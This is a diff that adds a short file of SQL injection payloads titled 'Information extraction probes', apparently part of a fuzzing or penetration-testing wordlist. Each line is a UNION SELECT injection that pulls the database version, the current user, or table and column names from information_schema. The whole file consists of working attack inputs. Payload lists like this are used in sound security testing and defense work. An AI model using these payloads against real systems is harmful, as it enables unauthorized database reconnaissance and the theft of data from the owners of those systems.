@@ -1,0 +1,7 @@
+# Information extraction probes
+' UNION SELECT @@version--
+' UNION SELECT version()--
+' UNION SELECT user()--
+' UNION SELECT current_user()--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
